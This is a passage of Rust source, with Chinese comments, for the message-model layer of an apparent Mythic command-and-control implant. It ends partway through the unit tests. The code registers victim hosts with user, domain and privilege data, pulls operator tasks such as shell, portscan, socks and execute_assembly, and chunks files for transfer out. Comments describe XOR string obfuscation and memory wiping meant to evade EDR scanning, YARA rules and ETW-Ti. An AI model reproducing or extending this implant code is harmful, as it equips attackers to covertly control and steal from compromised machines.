extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use core::mem::MaybeUninit;
use serde::{Deserialize, Serialize};
use crate::profiles::crypto::zeroize_slice;

// #![allow(unused)]

/// 字符串硬编码隐蔽宏 (Zero-Dependency Compile-Time Obfuscation Macro)
///
/// 规避 C2 协议敏感字符串 (如 "checkin", "get_tasking", "post_response", "success") 在二进制 .rdata 节中明文固化
#[macro_export]
macro_rules! obfstr {
    ($s:expr) => {{
        const KEY: u8 = 0xAA;
        const LEN: usize = $s.len();
        const OBF: [u8; LEN] = {
            let bytes = $s.as_bytes();
            let mut res = [0u8; LEN];
            let mut i = 0;
            while i < LEN {
                res[i] = bytes[i] ^ KEY;
                i += 1;
            }
            res
        };
        const DEOBF: [u8; LEN] = {
            let mut res = [0u8; LEN];
            let mut i = 0;
            while i < LEN {
                res[i] = OBF[i] ^ KEY;
                i += 1;
            }
            res
        };
        unsafe { core::str::from_utf8_unchecked(&DEOBF) }
    }};
}

// ==========================================
// 错误控制与隐蔽模型错误代号 (ModelError)
// 遵循 crypto.rs/http.rs 的 #[repr(u8)] 零分配单字节错误代号规范
// ==========================================

/// Models 层解析与数据验证错误代号
/// 
/// 严格限定为单字节 u8 判别值布局，无堆分配，Release 模式下不导出字符串/符号信息。
#[repr(u8)]
#[derive(PartialEq, Eq, Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub enum ModelError {
    /// Action 字段不匹配或空
    InvalidAction = 40,
    /// Response status 字段异常 (如 "error")
    ResponseStatusError = 41,
    /// 必填参数缺失或校验失败
    MissingRequiredField = 42,
    /// 文件分片序号或总片数参数非法
    InvalidChunkInfo = 43,
}

// 实际使用中可以直接 ModelError::InvalidAction as u8 得到错误代码,不需要调用该函数
impl ModelError {
    #[inline(always)]
    pub const fn code(self) -> u8 {
        self as u8
    }
}

// ==========================================
// 内存安全与隐蔽性辅助工具函数
// ==========================================

/// 将 alloc::string::String 底层字节缓冲区原地刷零
///
/// 通信中，服务端返回的命令文本、参数及响应字段（如 command, parameters, error）
/// 在离开作用域前必须被物理洗白，防止 EDR 通过 Process Minidump、PAGE_READWRITE 内存扫描或 YARA 规则检索提取敏感指令与通信凭据。
#[inline(always)]
pub fn zeroize_string(s: &mut String) {
    unsafe {
        zeroize_slice(s.as_bytes_mut());
    }
}

// ==========================================
// mythic协议请求数据结构 (Agent -> Mythic Server)
// 均采用零拷贝借用切片 (&'a str)，避免运行期堆分配
// ==========================================

/// 上线注册请求包 (Agent -> Mythic Server):agent在目标设备上首次启动/建立通信链路时,打包目标设备的相关数据,向mythic服务端注册一个新的callback会话.callback原意是回调,区别于传统c/s架构,目标通常位于内网/防火墙/nat后,服务端无法主动连接.只能由agent主动向外发包.服务端收到后,会记录目标设备信息.这个建立好的双向通信管道称为 callback session
/// 
/// 所谓callback,是一个在服务端成功登记并保持连接/心跳的agent会话实例
///
/// 结构体字段采用 `&'a str` 静态/栈引用，极大削减动态内存分配开销 详见注释1
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct CheckinMessage<'a> {
    /// 接口动作标志，固定为 "checkin"
    pub action: &'a str,
    /// 宿主 IP 地址 (如 "192.168.1.100")
    pub ip: &'a str,
    /// 操作系统版本信息 (如 "Windows 11 Pro 10.0.22631")
    pub os: &'a str,
    /// 运行该 Agent 的用户凭据 (如 "SYSTEM" 或 "DOMAIN\\User")
    pub user: &'a str,
    /// 目标主机名 (如 "DESKTOP-VICTIM")
    pub host: &'a str,
    /// Agent 当前进程 PID
    pub pid: u32,
    /// Payload 的 UUID 字符串 (36 字节)
    pub uuid: &'a str,
    /// 系统架构类型 (如 "x64" / "x86")
    pub architecture: &'a str,
    /// 主机所在域名或工作组
    pub domain: &'a str,
    /// 当前进程名称 (如 "thanatos.exe"),当该字段是None时,跳过该字段,不写入json中
    #[serde(skip_serializing_if = "Option::is_none")]
    pub process_name: Option<&'a str>,
    /// 进程权限级别 (如 3代表High/Admin, 4代表SYSTEM)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u8>,
}

impl<'a> CheckinMessage<'a> {
    /// 创建一个新的上线消息实例
    /// 这里是函数定义时的形参,要和最终运行时的实参分开看待.new是一个构造函数,本身不产生结构体中字段的具体值,而是负责接收外部传入的具体值,并存入结构体中.
    /// ip是ip:ip的简略写法
    #[inline]
    pub fn new(
        uuid: &'a str,
        ip: &'a str,
        os: &'a str,
        user: &'a str,
        host: &'a str,
        pid: u32,
        architecture: &'a str,
        domain: &'a str,
    ) -> Self {
        Self {
            action: obfstr!("checkin"),
            ip,
            os,
            user,
            host,
            pid,
            uuid,
            architecture,
            domain,
            process_name: None,
            integrity_level: None,
        }
    }

    /// 链式追加进程名称与完整性级别信息 (零分配)
    #[inline]
    pub fn with_process_info(
        mut self,
        process_name: Option<&'a str>,
        integrity_level: Option<u8>,
    ) -> Self {
        self.process_name = process_name;
        self.integrity_level = integrity_level;
        self
    }

    /// 校验 Checkin 数据有效性
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr!("checkin") {
            return Err(ModelError::InvalidAction);
        }
        if self.uuid.len() != 36 {
            return Err(ModelError::MissingRequiredField);
        }
        Ok(())
    }
}

/// 心跳轮询拉取任务请求包 (Agent -> Mythic Server) ,Agent 周期性心跳拉取（Heartbeat Polling）:Agent 处于Sleep（休眠）等待期结束或心跳触发时，向服务端发出出站请求，询问是否有操作员下发的待执行命令
/// 详见注释2
#[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct GetTaskingMessage<'a> {
    /// 接口动作标志，固定为 "get_tasking"
    pub action: &'a str,
    /// 单次期望拉取的最大任务数量 (标准为 1)
    pub tasking_size: i32,
}

/// Default是core::default::Default提供的trait,定义了一个类型的默认标准初始值.后续可用 GetTaskingMessage::default()直接初始化
impl<'a> Default for GetTaskingMessage<'a> {
    #[inline]
    fn default() -> Self {
        Self {
            action: obfstr!("get_tasking"),
            tasking_size: 1,
        }
    }
}

impl<'a> GetTaskingMessage<'a> {
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr!("get_tasking") {
            return Err(ModelError::InvalidAction);
        }
        Ok(())
    }
}

/// 单个任务的执行结果条目或文件分片回显条目(agent -> mythic server):封装客户端命令执行完毕后的终端输出(user_out),任务完成状态(completed),或大文件传输时的分片数据（file_id、chunk_num、total_chunks、chunk_data）
/// 
/// 适用:命令行输出回显(如 dir结果),耗时命令的分阶段增量回显,文件上传/下载分片数据打包
/// new用于普通命令行回显,new_file_chunk()用于大文件的分片数据封装.全程基于栈引用,零堆分配
/// 详见注释3
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TaskResponseItem<'a> {
    /// 对应的 Task ID (UUID 字符串)
    pub task_id: &'a str,
    /// 任务命令在本地执行控制台的输出回显文本
    pub user_output: &'a str,
    /// 任务是否已完全结束
    pub completed: bool,
    /// 可选的状态标识 (如 "error" 或 "success")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<&'a str>,
    /// 大文件分片/文件传输所必需的远程文件 ID (Mythic file_id)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_id: Option<&'a str>,
    /// 当前分片序号 (从 1 开始递增)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_num: Option<u32>,
    /// 总分片数
    #[serde(skip_serializing_if = "Option::is_none")]
    pub total_chunks: Option<u32>,
    /// 当前分片的 Base64 编码数据切片 (直接引用栈/静态暂存区，零堆分配)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<&'a str>,
}

impl<'a> TaskResponseItem<'a> {
    #[inline]
    pub fn new(task_id: &'a str, user_output: &'a str, completed: bool) -> Self {
        Self {
            task_id,
            user_output,
            completed,
            status: None,
            file_id: None,
            chunk_num: None,
            total_chunks: None,
            chunk_data: None,
        }
    }

    /// 构建大文件传输/分片回传条目 (零堆分配借用切片)
    #[inline]
    pub fn new_file_chunk(
        task_id: &'a str,
        file_id: &'a str,
        chunk_num: u32,
        total_chunks: u32,
        chunk_data: &'a str,
        completed: bool,
    ) -> Self {
        Self {
            task_id,
            user_output: "",
            completed,
            status: None,
            file_id: Some(file_id),
            chunk_num: Some(chunk_num),
            total_chunks: Some(total_chunks),
            chunk_data: Some(chunk_data),
        }
    }

    /// 校验条目格式有效性
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.task_id.is_empty() {
            return Err(ModelError::MissingRequiredField);
        }
        if let (Some(num), Some(total)) = (self.chunk_num, self.total_chunks) {
            if num == 0 || num > total {
                return Err(ModelError::InvalidChunkInfo);
            }
        }
        Ok(())
    }
}

/// 批量任务回执请求包 (Agent -> Mythic Server):定义用于向服务端回传任务执行结果的数据结构.将一个或多个TaskResponseItem<'a> 组合成标准 JSON 报文（action:"post_response"），回传给 Mythic 服务端
/// 
/// 适用:agent完成一个或多个任务后,批量回传执行结果
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct PostResponseMessage<'a> {
    /// 接口动作标志，固定为 "post_response"
    pub action: &'a str,
    /// 执行结果条目切片 (直接引用调用者栈帧上的临时数组)
    pub responses: &'a [TaskResponseItem<'a>],
}

impl<'a> PostResponseMessage<'a> {
    #[inline]
    pub fn new(responses: &'a [TaskResponseItem<'a>]) -> Self {
        Self {
            action: obfstr!("post_response"),
            responses,
        }
    }

    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr!("post_response") {
            return Err(ModelError::InvalidAction);
        }
        for resp in self.responses {
            resp.validate()?;
        }
        Ok(())
    }
}

// ==========================================
// 协议响应数据结构 (Mythic Server -> Agent)
// 支持零遗留 (Zero-Remanence) 内存擦除机制
// ==========================================

/// 服务端响应 Checkin 消息的结构 (Mythic Server -> Agent):服务端收到CheckinMessage 并成功注册上线会话后，若成功,返回包含 status: "success",且Agent 将使用其提供的 copy_id_to函数将新的 Callback UUID物理拷贝保存至栈/静态缓冲区中，用以取代初始的静态 Payload UUID
///
/// 采用零拷贝切片借用 (`&'a str`)，直接引用解密明文暂存区（raw_buf），彻底杜绝在 Windows 10/11 Segment Heap 上进行微小高频堆分配（ETW-Ti 规避），
/// 并防止明文字符串在堆释放后残留于空闲链表（Heap Remanence）。
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerCheckinResponse<'a> {
    pub action: &'a str,
    pub status: &'a str,
    /// 成功 Checkin 后，服务端分配给该实例的 Callback ID (用于取代最初的 Payload UUID)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub id: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<&'a str>,
}

impl<'a> ServerCheckinResponse<'a> {
    #[inline]
    pub fn new(action: &'a str, status: &'a str, id: Option<&'a str>) -> Self {
        Self {
            action,
            status,
            id,
            error: None,
        }
    }

    /// 校验响应状态
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr!("checkin") {
            return Err(ModelError::InvalidAction);
        }
        if self.status != obfstr!("success") {
            return Err(ModelError::ResponseStatusError);
        }
        Ok(())
    }

    /// 将服务端下发的 Callback UUID (36 字节) 安全拷贝至外部持久缓冲区中，
    /// 彻底切断对临时 raw_buf 明文缓冲区的生命周期借用，使得调用方能立即清空 raw_buf，同时杜绝堆分配。
    pub fn copy_id_to(&self, dest: &mut [u8; 36]) -> Result<bool, ModelError> {
        if let Some(id_str) = self.id {
            if id_str.len() == 36 {
                dest.copy_from_slice(id_str.as_bytes());
                return Ok(true);
            }
            return Err(ModelError::MissingRequiredField);
        }
        Ok(false)
    }
}

/// 服务端返回给 Agent 的单个任务定义(拥有所有权版本):与 MythicTaskRef 功能相同，但字段使用拥有所有权的 String 和 Vec
/// 
/// 当拉取到的任务属于耗时较长的异步后台任务（例如大子网端口扫描、文件全盘搜索、反向 SOCKS5 代理）时，需要将 Task 对象跨线程派发到独立的 Worker线程中执行
/// 实现的to_owned(),仅在必须跨线程生命周期时才显示触发堆分配
#[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct MythicTask {
    /// 任务的唯一标识 ID
    pub id: String,
    /// 调用的指令名称 (如 "shell", "whoami", "sleep", "exit")
    pub command: String,
    /// 指令的具体入参 (JSON 文本或命令行参数)
    #[serde(default)]
    pub parameters: String,
}

impl MythicTask {
    /// 校验 Task 结构有效性
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.id.is_empty() || self.command.is_empty() {
            return Err(ModelError::MissingRequiredField);
        }
        Ok(())
    }

    /// 判断当前任务是否为耗时较长的数据采集/扫描/后台任务
    pub fn is_long_running(&self) -> bool {
        MythicTaskRef::new(&self.id, &self.command, &self.parameters).is_long_running()
    }

    /// 手动安全洗白任务中的指令、参数与 ID 字段，防止敏感指令残留于堆内存
    pub fn zeroize(&mut self) {
        zeroize_string(&mut self.id);
        zeroize_string(&mut self.command);
        zeroize_string(&mut self.parameters);
    }
}

impl Drop for MythicTask {
    fn drop(&mut self) {
        self.zeroize();
    }
}

/// 服务端响应 GetTasking 消息的结构 (Mythic Server -> Agent)
#[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerTaskingResponse {
    pub action: String,
    pub status: String,
    /// 下发的任务清单列表
    #[serde(default)]
    pub tasks: Vec<MythicTask>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

impl ServerTaskingResponse {
    /// 校验 Tasking 响应有效性
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.status != obfstr!("success") {
            return Err(ModelError::ResponseStatusError);
        }
        for task in &self.tasks {
            task.validate()?;
        }
        Ok(())
    }

    /// 手动安全洗白包含的所有任务及字段
    pub fn zeroize(&mut self) {
        zeroize_string(&mut self.action);
        zeroize_string(&mut self.status);
        for task in self.tasks.iter_mut() {
            task.zeroize();
        }
        if let Some(ref mut err) = self.error {
            zeroize_string(err);
        }
    }
}

impl Drop for ServerTaskingResponse {
    fn drop(&mut self) {
        self.zeroize();
    }
}

// ==========================================
// 栈上固定容量与大栈缓冲区模型 (Zero-Heap Stack Allocator Models)
// 划拨连续栈切片并在擦除时将 Offset 清零，杜绝堆分配与 Heap Remanence
// ==========================================

/// 栈上固定容量向量 (Zero-Heap Stack Vector)
///
/// 彻底替换 `alloc::vec::Vec` 在零拷贝通信切片反序列化过程中的堆分配需求。
/// 内部数据完全存在于栈帧内存中，提供与 Vec 兼容的切片操作接口与 Serde Deserialize 实现。
pub struct StackVec<T, const N: usize> {
    data: [MaybeUninit<T>; N],
    len: usize,
}

impl<T, const N: usize> StackVec<T, N> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            data: [const { MaybeUninit::uninit() }; N],
            len: 0,
        }
    }

    #[inline]
    pub fn push(&mut self, item: T) -> Result<(), T> {
        if self.len < N {
            self.data[self.len].write(item);
            self.len += 1;
            Ok(())
        } else {
            Err(item)
        }
    }

    #[inline(always)]
    pub fn len(&self) -> usize {
        self.len
    }

    #[inline(always)]
    pub fn is_empty(&self) -> bool {
        self.len == 0
    }

    #[inline(always)]
    pub fn capacity(&self) -> usize {
        N
    }

    #[inline(always)]
    pub fn as_slice(&self) -> &[T] {
        // 安全保证：0..self.len 范围内的元素均已通过 push 正确初始化
        unsafe { MaybeUninit::slice_assume_init_ref(&self.data[..self.len]) }
    }

    #[inline(always)]
    pub fn as_mut_slice(&mut self) -> &mut [T] {
        unsafe { MaybeUninit::slice_assume_init_mut(&mut self.data[..self.len]) }
    }
}

impl<T: Clone, const N: usize> Clone for StackVec<T, N> {
    fn clone(&self) -> Self {
        let mut new_vec = Self::new();
        for item in self.as_slice() {
            let _ = new_vec.push(item.clone());
        }
        new_vec
    }
}

impl<T: Copy, const N: usize> Copy for StackVec<T, N> {}

impl<T: PartialEq, const N: usize> PartialEq for StackVec<T, N> {
    fn eq(&self, other: &Self) -> bool {
        self.as_slice() == other.as_slice()
    }
}

impl<T: Eq, const N: usize> Eq for StackVec<T, N> {}

impl<T: core::fmt::Debug, const N: usize> core::fmt::Debug for StackVec<T, N> {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        self.as_slice().fmt(f)
    }
}

impl<T, const N: usize> Drop for StackVec<T, N> {
    fn drop(&mut self) {
        for elem in self.as_mut_slice() {
            unsafe {
                core::ptr::drop_in_place(elem);
            }
        }
    }
}

impl<T, const N: usize> Default for StackVec<T, N> {
    fn default() -> Self {
        Self::new()
    }
}

impl<T, const N: usize> core::ops::Deref for StackVec<T, N> {
    type Target = [T];
    #[inline(always)]
    fn deref(&self) -> &[T] {
        self.as_slice()
    }
}

impl<T, const N: usize> core::ops::DerefMut for StackVec<T, N> {
    #[inline(always)]
    fn deref_mut(&mut self) -> &mut [T] {
        self.as_mut_slice()
    }
}

impl<'a, T, const N: usize> IntoIterator for &'a StackVec<T, N> {
    type Item = &'a T;
    type IntoIter = core::slice::Iter<'a, T>;
    #[inline(always)]
    fn into_iter(self) -> Self::IntoIter {
        self.as_slice().iter()
    }
}

impl<'de, T: Deserialize<'de>, const N: usize> Deserialize<'de> for StackVec<T, N> {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        struct StackVecVisitor<T, const N: usize>(core::marker::PhantomData<T>);

        impl<'de, T: Deserialize<'de>, const N: usize> serde::de::Visitor<'de> for StackVecVisitor<T, N> {
            type Value = StackVec<T, N>;

            fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
                write!(formatter, "a sequence of up to N elements")
            }

            fn visit_seq<A>(self, mut seq: A) -> Result<Self::Value, A::Error>
            where
                A: serde::de::SeqAccess<'de>,
            {
                let mut vec = StackVec::new();
                while let Some(element) = seq.next_element()? {
                    if vec.push(element).is_err() {
                        while let Some(_: serde::de::IgnoredAny) = seq.next_element()? {}
                        break;
                    }
                }
                Ok(vec)
            }
        }

        deserializer.deserialize_seq(StackVecVisitor(core::marker::PhantomData))
    }
}

impl<T: Serialize, const N: usize> Serialize for StackVec<T, N> {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        self.as_slice().serialize(serializer)
    }
}

/// 预先分配的大栈缓冲区 (Stack Arena Buffer)
///
/// 从栈内存中划出连续字节切片，擦除时直接把 Offset 清零，杜绝所有堆分配与 Heap Remanence。
pub struct StackArena<const CAP: usize> {
    buf: [u8; CAP],
    offset: usize,
}

impl<const CAP: usize> StackArena<CAP> {
    #[inline(always)]
    pub const fn new() -> Self {
        Self {
            buf: [0u8; CAP],
            offset: 0,
        }
    }

    #[inline]
    pub fn alloc_slice(&mut self, len: usize) -> Option<&mut [u8]> {
        if self.offset.saturating_add(len) > CAP {
            return None;
        }
        let start = self.offset;
        let end = start + len;
        self.offset = end;
        Some(&mut self.buf[start..end])
    }

    #[inline(always)]
    pub fn used_slice(&self) -> &[u8] {
        &self.buf[..self.offset]
    }

    #[inline(always)]
    pub fn used_slice_mut(&mut self) -> &mut [u8] {
        let off = self.offset;
        &mut self.buf[..off]
    }

    #[inline(always)]
    pub fn offset(&self) -> usize {
        self.offset
    }

    #[inline(always)]
    pub fn remaining(&self) -> usize {
        CAP.saturating_sub(self.offset)
    }

    #[inline(always)]
    pub fn zeroize_and_reset(&mut self) {
        if self.offset > 0 {
            zeroize_slice(&mut self.buf[..self.offset]);
            self.offset = 0;
        }
    }
}

impl<const CAP: usize> Drop for StackArena<CAP> {
    fn drop(&mut self) {
        self.zeroize_and_reset();
    }
}

// ==========================================
// 零拷贝任务借用模型 (Zero-Copy Borrowed Task Models)
// 彻底规避 Windows 10/11 Segment Heap 高频堆分配与残留
// ==========================================

/// 服务端返回给 Agent 的单个任务定义 (零拷贝借用切片版),服务端 (Mythic Server) ➔ 客户端 (Agent):ServerTaskingResponseRef<'a> 接收服务端下发包含 tasks 数组的 JSON
/// MythicTaskRef<'a> 描述单条任务（Task ID、指令名称如 shell / whoami /sleep、指令入参 parameters）
/// 
/// 
///
/// 所有字段直接借用调用者提供的解密明文暂存区（`raw_buf`），在任务轮询与解析时做到 100% 零堆分配。规避win10/11 segment heap上频繁的内存申请痕迹,防止edr通过etw-ti捕获高频堆抖动
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct MythicTaskRef<'a> {
    /// 任务的唯一标识 ID
    pub id: &'a str,
    /// 调用的指令名称 (如 "shell", "whoami", "sleep", "exit", "download", "upload")
    pub command: &'a str,
    /// 指令的具体入参 (JSON 文本或命令行参数)
    #[serde(default)]
    pub parameters: &'a str,
}

impl<'a> MythicTaskRef<'a> {
    #[inline]
    pub fn new(id: &'a str, command: &'a str, parameters: &'a str) -> Self {
        Self {
            id,
            command,
            parameters,
        }
    }

    /// 校验 Task 结构有效性
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.id.is_empty() || self.command.is_empty() {
            return Err(ModelError::MissingRequiredField);
        }
        Ok(())
    }

    /// 仅在需要将任务派发至后台长周期执行线程时，才显式转换为拥有所有权的结构体
    pub fn to_owned(&self) -> MythicTask {
        MythicTask {
            id: String::from(self.id),
            command: String::from(self.command),
            parameters: String::from(self.parameters),
        }
    }

    /// 判断当前任务是否为耗时较长的数据采集/扫描/后台任务（如大子网端口扫描、文件流传输、SOCKS5 代理等）。
    /// 
    /// 结合“超时预判机制” + “指令分类映射” + “隐式/显式后台标志判断”：
    /// 1. 超时预判：解析 parameters 中包含的 timeout/duration 参数，超出阈值即判定为长耗时任务。
    /// 2. 指令分类：匹配 "portscan", "scan", "download", "upload", "socks", "pivot", "find", "search", "execute_assembly" 等数据采集/扫描/代理指令。
    /// 3. 隐式/显式标志：解析 parameters 中是否包含 `"async": true`, `"background": true`, `--async`, `-b` 等后台参数。
    pub fn is_long_running(&self) -> bool {
        self.is_long_running_with_threshold(5)
    }

    /// 自定义超时阈值（单位：秒）的长耗时任务预判
    pub fn is_long_running_with_threshold(&self, threshold_secs: u64) -> bool {
        // 1. 显式/隐式标志与参数模式解析 (async / background)
        if self.parameters.contains(obfstr!("\"async\":true"))
            || self.parameters.contains(obfstr!("\"async\": true"))
            || self.parameters.contains(obfstr!("\"background\":true"))
            || self.parameters.contains(obfstr!("\"background\": true"))
            || self.parameters.contains(obfstr!("--async"))
            || self.parameters.contains(obfstr!("-b"))
        {
            return true;
        }

        // 2. 超时预判机制：解析 JSON / 命令行参数中的 timeout / duration (秒)
        if let Some(timeout) = self.extract_timeout_sec() {
            if timeout >= threshold_secs {
                return true;
            }
        }

        // 3. 指令分类映射 (端口扫描、文件搜索、SOCKS代理、文件下载上传等)
        let cmd = self.command;
        if cmd == obfstr!("portscan")
            || cmd == obfstr!("scan")
            || cmd == obfstr!("download")
            || cmd == obfstr!("upload")
            || cmd == obfstr!("socks")
            || cmd == obfstr!("pivot")
            || cmd == obfstr!("find")
            || cmd == obfstr!("search")
            || cmd == obfstr!("execute_assembly")
        {
            return true;
        }

        false
    }

    /// 从 parameters 切片中提取超时设定预判值 (秒)，全程零堆分配
    fn extract_timeout_sec(&self) -> Option<u64> {
        let p = self.parameters;
        if let Some(idx) = p.find(obfstr!("\"timeout\"")) {
            let rest = &p[idx + 9..];
            let trimmed = rest.trim_start_matches(|c: char| c == ':' || c == ' ' || c == '"' || c == '=');
            let mut num: u64 = 0;
            let mut found_digit = false;
            for b in trimmed.bytes() {
                if b.is_ascii_digit() {
                    found_digit = true;
                    num = num.saturating_mul(10).saturating_add((b - b'0') as u64);
                } else if found_digit {
                    break;
                }
            }
            if found_digit {
                return Some(num);
            }
        }
        if let Some(idx) = p.find(obfstr!("--timeout")) {
            let rest = &p[idx + 9..];
            let trimmed = rest.trim_start_matches(|c: char| c == '=' || c == ' ');
            let mut num: u64 = 0;
            let mut found_digit = false;
            for b in trimmed.bytes() {
                if b.is_ascii_digit() {
                    found_digit = true;
                    num = num.saturating_mul(10).saturating_add((b - b'0') as u64);
                } else if found_digit {
                    break;
                }
            }
            if found_digit {
                return Some(num);
            }
        }
        None
    }
}

/// 服务端响应 GetTasking 消息的结构 (零拷贝借用切片版)
#[derive(Clone, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerTaskingResponseRef<'a> {
    pub action: &'a str,
    pub status: &'a str,
    /// 下发的任务清单列表 (使用 StackVec 替代 Vec，100% 零堆分配)
    #[serde(borrow, default)]
    pub tasks: StackVec<MythicTaskRef<'a>, 32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<&'a str>,
}

impl<'a> ServerTaskingResponseRef<'a> {
    /// 校验 Tasking 响应有效性
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr!("get_tasking") {
            return Err(ModelError::InvalidAction);
        }
        if self.status != obfstr!("success") {
            return Err(ModelError::ResponseStatusError);
        }
        for task in &self.tasks {
            task.validate()?;
        }
        Ok(())
    }
}

// ==========================================
// 大文件分片传输专属协议模型 (File Chunking Protocol)
// ==========================================

/// 大文件分片上传/下载专属报文载荷 (Agent <-> Mythic Server):专为大文件流式传输设计,包含当前分片序号（chunk_num）、总分片数（total_chunks）、文件唯一 ID（file_id）以及 Base64 编码的二进制数据（chunk_data）
///
/// 严格契合 crypto.rs 单片 2960 字节净预算，完全基于栈/静态缓冲区切片借用，零动态堆分配。配合 is_last_chunk() 可快速进行流式控制。保证不论文件多大（如 10 GB），Agent 内存始终稳定占用在 2KB 栈空间内
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileChunkPayload<'a> {
    /// 传输动作标志 (如 "upload" 或 "download")
    pub action: &'a str,
    /// 关联的任务 UUID
    pub task_id: &'a str,
    /// 服务端下发或已注册的文件 UUID
    pub file_id: &'a str,
    /// 当前分片序号 (从 1 开始)
    pub chunk_num: u32,
    /// 总分片数 (由文件总长度除以分片大小向上取整)
    pub total_chunks: u32,
    /// 分片二进制内容的 Base64 编码字符串切片
    pub chunk_data: &'a str,
}

impl<'a> FileChunkPayload<'a> {
    #[inline]
    pub fn new(
        action: &'a str,
        task_id: &'a str,
        file_id: &'a str,
        chunk_num: u32,
        total_chunks: u32,
        chunk_data: &'a str,
    ) -> Self {
        Self {
            action,
            task_id,
            file_id,
            chunk_num,
            total_chunks,
            chunk_data,
        }
    }

    /// 检查当前分片是否为传输过程中的最后一片
    #[inline(always)]
    pub fn is_last_chunk(&self) -> bool {
        self.chunk_num == self.total_chunks
    }

    /// 校验分片序号和必填字段
    pub fn validate(&self) -> Result<(), ModelError> {
        if self.task_id.is_empty() || self.file_id.is_empty() {
            return Err(ModelError::MissingRequiredField);
        }
        if self.chunk_num == 0 || self.chunk_num > self.total_chunks {
            return Err(ModelError::InvalidChunkInfo);
        }
        Ok(())
    }
}

// ==========================================
// 单元测试模块
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_checkin_serialization_and_validation() {
        let msg = CheckinMessage::new(
            "12345678-1234-1234-1234-1234567890ab",
            "192.168.1.10",
            "Windows 11 Pro",
            "SYSTEM",
            "VICTIM-PC",
            1234,
            "x64",
            "WORKGROUP",
        );

        assert!(msg.validate().is_ok());

        let json_str = serde_json::to_string(&msg).unwrap();
        assert!(json_str.contains(r#""action":"checkin""#));
        assert!(json_str.contains(r#""user":"SYSTEM""#));
        assert!(!json_str.contains("process_name"));
    }

    #[test]
    fn test_get_tasking_serialization() {
        let msg = GetTaskingMessage::default();
        assert!(msg.validate().is_ok());
        let json_str = serde_json::to_string(&msg).unwrap();
        assert_eq!(json_str, r#"{"action":"get_tasking","tasking_size":1}"#);
    }

    #[test]
    fn test_server_tasking_response_deserialization_and_validation() {
        let raw_response = r#"{
            "action": "get_tasking",
            "status": "success",
            "tasks": [
                {
                    "id": "task-uuid-001",
                    "command": "whoami",
                    "parameters": ""
                }
            ]
        }"#;

        let resp: ServerTaskingResponse = serde_json::from_str(raw_response).unwrap();
        assert!(resp.validate().is_ok());
        assert_eq!(resp.status, "success");
        assert_eq!(resp.tasks.len(), 1);
        assert_eq!(resp.tasks[0].command, "whoami");
    }

    #[test]
    fn test_models_zeroization() {
        let mut task = MythicTask {
            id: String::from("task-123"),
            command: String::from("shell"),
            parameters: String::from("whoami /priv"),
        };
        task.zeroize();
        assert_eq!(task.command.as_bytes(), &[0u8; 5]);
        assert_eq!(task.parameters.as_bytes(), &[0u8; 12]);
    }

    #[test]
    fn test_model_error_codes() {
        assert_eq!(ModelError::InvalidAction.code(), 40);
        assert_eq!(ModelError::ResponseStatusError.code(), 41);
        assert_eq!(ModelError::MissingRequiredField.code(), 42);
    }

    #[test]
    fn test_post_response_serialization_and_validation() {
        let item = TaskResponseItem::new("task-uuid-123", "whoami output", true);
        let items = [item];
        let msg = PostResponseMessage::new(&items);
        assert!(msg.validate().is_ok());

        let json_str = serde_json::to_string(&msg).unwrap();
        assert!(json_str.contains(r#""action":"post_response""#));
        assert!(json_str.contains(r#""task_id":"task-uuid-123""#));
        assert!(json_str.contains(r#""user_output":"whoami output""#));
        assert!(json_str.contains(r#""completed":true"#));
    }

    #[test]
    fn test_server_checkin_response_zero_copy_and_copy_id() {
        let raw_json = r#"{"action":"checkin","status":"success","id":"12345678-1234-1234-1234-1234567890ab"}"#;
